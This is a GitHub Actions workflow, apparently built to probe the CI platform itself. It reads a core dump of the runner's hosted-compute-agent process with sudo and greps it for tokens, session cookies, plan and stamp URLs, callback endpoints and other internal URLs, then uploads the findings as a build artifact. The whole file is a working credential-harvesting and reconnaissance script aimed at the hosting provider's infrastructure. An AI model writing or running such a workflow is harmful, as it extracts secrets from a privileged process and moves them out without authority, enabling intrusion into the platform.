name: Core Dump Analysis
on:
  push:
    branches: [master]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - continue-on-error: true
        run: |
          mkdir -p dist
          HCA_PID=$(pgrep -f hosted-compute-agent)
          echo "PID=$HCA_PID"
          
          # Search for HTTP responses in core dump
          echo "=== HTTP response bodies ===" > dist/core2.txt
          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -E "HTTP/|planId|runStampUrl|token|stamp|session" | sort -u | head -30 >> dist/core2.txt
          
          # Search for Set-Cookie or sticky session
          echo "=== Cookies/Session ===" >> dist/core2.txt
          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -iE "set-cookie|session|sticky|affinity|node|pod" | sort -u | head -20 >> dist/core2.txt
          
          # Search for StartPlan response
          echo "=== StartPlan response ===" >> dist/core2.txt
          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -iE "startplan|StartPlan|runStamp|stamp_url" | sort -u | head -20 >> dist/core2.txt
          
          # Look for any URL that's NOT in settings
          echo "=== Other URLs ===" >> dist/core2.txt
          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -E "https?://[a-z]" | grep -v "settings\|google\|azure\|githubusercontent\|github.com/actions" | sort -u | head -20 >> dist/core2.txt
          
          # Search for callback URLs or receiver URLs
          echo "=== Callback URLs ===" >> dist/core2.txt
          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -E "receiver|callback|result|preJob|permissions" | sort -u | head -20 >> dist/core2.txt
          
          echo "=== Done ===" >> dist/core2.txt

      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: core-analysis
          path: dist/
